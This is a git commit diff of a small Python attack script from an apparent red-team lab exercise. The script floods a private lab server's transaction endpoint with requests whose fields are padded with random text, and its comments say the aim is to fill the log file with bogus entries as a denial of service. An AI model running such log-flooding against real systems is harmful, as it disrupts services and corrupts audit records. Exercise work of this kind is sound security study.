bdf3a329bce2bd557b86e2828f24cd4b775bc9a5
Dupré Naïl <nail.dupre@gmail.com>
2020-11-25 22:50:19 +0100

    curl_request_set_length: changed name to better reflect what it does, added more randomization

--- secure_cctf/red_task/scripts/curlFillLogFile.py
+++ secure_cctf/red_task/scripts/curlFillLogFile.py
@@ -1,6 +1,7 @@
 #!/usr/bin/python
 
 #Random curl request, the only thing changing is the length of it. Can be considered denial of service I believe
+#Its aim is to fill the log file with bogus information
 import requests
 import random
 import string
@@ -12,22 +13,36 @@ password = ""
 
 beg_req = "http://10.1.5.2/process.php"
 
+#Create a dummy request, which length correspond to our first argument, and then send it
 def fill_log(length):
     global username
     
     types = ["deposit", "withdraw"]
-    amount = random.randint(100, 100000)
+    amount = "1"
     drop = random.choice(types)
+    temp_username = username
+    temp_password = password
+    temp_amount = amount
+    #Depending on choice, either username, password or amount will be lengthened
+    choice = random.randint(1,3)
     append_rand = ''.join(random.choice(string.ascii_lowercase) for i in range(int(length)))
-    temp_username = username +append_rand
+    if choice == 1:
+        temp_username = username + append_rand
+    if choice == 2:
+        temp_password = password + append_rand
+    if choice == 3 :
+        temp_amount = amount + append_rand
+
+    #Craft the second part of our request  
     params = (
         ('user', temp_username),
-        ('pass', password),
+        ('pass', temp_password),
         ('drop', drop),
-        ('amount', amount),
+        ('amount', temp_amount),
     )
+    #Send it to the server
     response = requests.get(beg_req, params=params)
-    print(response.text)
+    #print(response.text)
 
 
 def main():
